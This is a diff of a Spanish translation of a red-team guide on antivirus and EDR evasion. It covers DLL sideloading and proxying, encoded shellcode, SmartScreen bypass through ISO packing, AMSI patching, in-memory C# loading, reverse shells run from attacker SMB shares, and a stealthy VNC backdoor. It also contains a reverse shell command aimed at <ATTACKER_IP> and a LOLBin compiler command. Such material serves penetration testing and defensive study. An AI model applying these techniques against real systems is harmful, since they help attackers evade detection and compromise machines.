@@ -54,7 +54,7 @@ Resulta que el nombre del equipo Sandbox de Microsoft Defender es HAL9TH, por lo
 
 Algunos otros consejos muy buenos de [@mgeeky](https://twitter.com/mariuszbit) para ir en contra de los Sandboxes
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (2).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>
 
 Como hemos dicho antes en esta publicación, las **herramientas públicas** eventualmente **serán detectadas**, así que, deberías preguntarte algo:
 
@@ -63,12 +63,12 @@ Por ejemplo, si quieres volcar LSASS, ¿realmente necesitas usar mimikatz? ¿O p
 La respuesta correcta probablemente es la última. Tomando mimikatz como ejemplo, probablemente sea uno de, si no el malware más marcado por los AV y EDR, mientras que el proyecto en sí es súper genial, también es una pesadilla trabajar con él para evitar los AV, así que busca alternativas para lo que estás tratando de lograr.
 
 {% hint style="info" %}
-Cuando modifiques tus cargas útiles para la evasión, asegúrate de **desactivar el envío automático de muestras** en Defender, y por favor, en serio, **NO SUBAS A VIRUSTOTAL** si tu objetivo es lograr la evasión a largo plazo. Si quieres comprobar si tu carga útil es detectada por un AV en particular, instálalo en una VM, intenta desactivar el envío automático de muestras y pruébalo allí hasta que estés satisfecho con el resultado.
+Cuando modifiques tus cargas útiles para la evasión, asegúrate de **desactivar la presentación automática de muestras** en Defender, y por favor, en serio, **NO SUBAS A VIRUSTOTAL** si tu objetivo es lograr la evasión a largo plazo. Si quieres comprobar si tu carga útil es detectada por un AV en particular, instálalo en una VM, intenta desactivar la presentación automática de muestras y pruébalo allí hasta que estés satisfecho con el resultado.
 {% endhint %}
 
 ## EXEs vs DLLs
 
-Siempre que sea posible, **prioriza el uso de DLLs para la evasión**, en mi experiencia, los archivos DLL suelen
+Siempre que sea posible, **prioriza el uso de DLLs para la evasión**, en mi experiencia
 ```powershell
 Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
     $binarytoCheck = "C:\Program Files\" + $_
@@ -81,9 +81,9 @@ Este comando mostrará la lista de programas susceptibles a DLL hijacking dentro
 
 Recomiendo encarecidamente que **exploréis vosotros mismos los programas DLL Hijackable/Sideloadable**, esta técnica es bastante sigilosa si se hace correctamente, pero si utilizáis programas DLL Sideloadable conocidos públicamente, podéis ser descubiertos fácilmente.
 
-Simplemente colocando una DLL maliciosa con el nombre que espera cargar un programa, no cargará vuestra carga útil, ya que el programa espera algunas funciones específicas dentro de esa DLL, para solucionar este problema, utilizaremos otra técnica llamada **DLL Proxying/Forwarding**.
+Simplemente colocando una DLL maliciosa con el nombre que espera cargar un programa, no cargará vuestro payload, ya que el programa espera algunas funciones específicas dentro de esa DLL, para solucionar este problema, utilizaremos otra técnica llamada **DLL Proxying/Forwarding**.
 
-**DLL Proxying** reenvía las llamadas que un programa hace desde la DLL proxy (y maliciosa) a la DLL original, preservando así la funcionalidad del programa y pudiendo manejar la ejecución de vuestra carga útil.
+**DLL Proxying** reenvía las llamadas que un programa hace desde la DLL proxy (y maliciosa) a la DLL original, preservando así la funcionalidad del programa y pudiendo manejar la ejecución de vuestro payload.
 
 Utilizaré el proyecto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)
 
@@ -112,7 +112,7 @@ Estos son los resultados:
 
 <figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>
 
-¡Tanto nuestro shellcode (codificado con [SGN](https://github.com/EgeBalci/sgn)) como la DLL proxy tienen una tasa de detección de 0/26 en [antiscan.me](https://antiscan.me)! Yo lo llamaría un éxito.
+¡Tanto nuestro shellcode (codificado con [SGN](https://github.com/EgeBalci/sgn)) como el proxy DLL tienen una tasa de detección de 0/26 en [antiscan.me](https://antiscan.me)! Yo lo llamaría un éxito.
 
 <figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>
 
@@ -265,7 +265,7 @@ Burning file onto ISO:
 
 [+] Generated file written to (size: 3420160): container.iso
 ```
-Aquí hay una demostración de cómo evitar SmartScreen empaquetando cargas útiles dentro de archivos ISO utilizando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)
+Aquí hay una demostración de cómo evitar SmartScreen empaquetando cargas útiles dentro de archivos ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)
 
 <figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>
 
@@ -273,7 +273,7 @@ Aquí hay una demostración de cómo evitar SmartScreen empaquetando cargas úti
 
 Cargar binarios de C# en memoria ha sido conocido durante mucho tiempo y sigue siendo una forma muy efectiva de ejecutar tus herramientas de post-explotación sin ser detectado por el antivirus.
 
-Dado que la carga útil se cargará directamente en memoria sin tocar el disco, solo tendremos que preocuparnos por parchar AMSI para todo el proceso.
+Dado que la carga útil se cargará directamente en la memoria sin tocar el disco, solo tendremos que preocuparnos por parchar AMSI para todo el proceso.
 
 La mayoría de los marcos de C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ya proporcionan la capacidad de ejecutar ensamblados de C# directamente en memoria, pero hay diferentes formas de hacerlo:
 
@@ -281,7 +281,7 @@ La mayoría de los marcos de C2 (sliver, Covenant, metasploit, CobaltStrike, Hav
 
 Implica **generar un nuevo proceso sacrificial**, inyectar tu código malicioso de post-explotación en ese nuevo proceso, ejecutar tu código malicioso y, cuando termines, matar el nuevo proceso. Esto tiene tanto sus beneficios como sus inconvenientes. El beneficio del método de bifurcación y ejecución es que la ejecución ocurre **fuera** de nuestro proceso de implante Beacon. Esto significa que si algo en nuestra acción de post-explotación sale mal o es detectado, hay una **mayor probabilidad** de que nuestro **implante sobreviva**. La desventaja es que tienes una **mayor probabilidad** de ser detectado por **detecciones de comportamiento**.
 
-<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 * **Inline**
 
@@ -299,7 +299,7 @@ También puedes cargar ensamblados de C# **desde PowerShell**, consulta [Invoke-
 
 Como se propone en [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), es posible ejecutar código malicioso utilizando otros lenguajes dando acceso a la máquina comprometida **al entorno del intérprete instalado en el recurso compartido SMB controlado por el atacante**. 
 
-Al permitir el acceso a los binarios del intérprete y al entorno en el recurso compartido SMB, puedes **ejecutar código arbitrario en estos lenguajes en la memoria** de la máquina comprometida.
+Al permitir el acceso a los binarios del intérprete y al entorno en el recurso compartido SMB, puedes **ejecutar código arbitrario en estos lenguajes dentro de la memoria** de la máquina comprometida.
 
 El repositorio indica: Defender todavía escanea los scripts, pero al utilizar Go, Java, PHP, etc., tenemos **más flexibilidad para evitar las firmas estáticas**. Las pruebas con scripts de shell inverso aleatorios y no ofuscados en estos lenguajes han resultado exitosas.
 
@@ -313,7 +313,7 @@ Te animo a que veas esta charla de [@ATTL4S](https://twitter.com/DaniLJ94), para
 
 {% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}
 
-Esta es también otra gran charla de [@mariuszbit](https://twitter.com/mariuszbit) sobre la evasión en profundidad.
+Esta es también otra gran charla de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasión en profundidad.
 
 {% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}
 
@@ -352,9 +352,9 @@ El **atacante** debe **ejecutar dentro** de su **host** el binario `vncviewer.ex
 
 **ADVERTENCIA:** Para mantener el sigilo, no debes hacer algunas cosas
 
-* No inicies `winvnc` si ya está en ejecución o activarás una [ventana emergente](https://i.imgur.com/1SROTTl.png). verifica si está en ejecución con `tasklist | findstr winvnc`
+* No inicies `winvnc` si ya está en ejecución o desencadenarás una [ventana emergente](https://i.imgur.com/1SROTTl.png). verifica si está en ejecución con `tasklist | findstr winvnc`
 * No inicies `winvnc` sin `UltraVNC.ini` en el mismo directorio o causará que se abra [la ventana de configuración](https://i.imgur.com/rfMQWcf.png)
-* No ejecutes `winvnc -h` para obtener ayuda o activarás una [ventana emergente](https://i.imgur.com/oc18wcu.png)
+* No ejecutes `winvnc -h` para obtener ayuda o desencadenarás una [ventana emergente](https://i.imgur.com/oc18wcu.png)
 
 ### GreatSCT
 
@@ -418,13 +418,13 @@ El empaquetado es el proceso de comprimir y cifrar nuestro código para hacerlo 
 
 - **PyInstaller**: PyInstaller es una herramienta que puede empaquetar nuestro código en un archivo ejecutable independiente.
 
-- **UPX**: UPX es una herramienta que puede comprimir nuestro archivo ejecutable para hacerlo más pequeño y más difícil de entender para las herramientas de análisis.
+- **cx_Freeze**: cx_Freeze es una herramienta similar a PyInstaller que puede empaquetar nuestro código en un archivo ejecutable independiente.
 
-- **Cifrado**: podemos cifrar nuestro archivo ejecutable para hacerlo más difícil de entender para las herramientas de análisis.
+- **UPX**: UPX es una herramienta que puede comprimir nuestro archivo ejecutable para hacerlo más pequeño y más difícil de entender para las herramientas de análisis.
 
 ## Conclusión
 
-La ofuscación y el empaquetado son técnicas efectivas para evadir la detección de AV. Al utilizar estas técnicas, podemos hacer que nuestro código sea más difícil de entender para las herramientas de análisis y, por lo tanto, evadir la detección. Sin embargo, es importante tener en cuenta que estas técnicas no son infalibles y que los AV están constantemente mejorando su capacidad para detectar malware.
+La ofuscación y el empaquetado son técnicas efectivas para evadir la detección de AV. Sin embargo, es importante tener en cuenta que estas técnicas no son infalibles y que los AV están constantemente mejorando sus capacidades de detección. Por lo tanto, es importante utilizar estas técnicas junto con otras medidas de seguridad, como la firma de código y el cifrado de comunicaciones, para garantizar la seguridad de nuestro código.
 ```
 back.exe <ATTACKER_IP> <PORT>
 ```
@@ -502,7 +502,7 @@ namespace ConnectBack
 ```
 [https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs](https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs)
 
-### C# usando el compilador
+### C# usando compilador
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
 ```
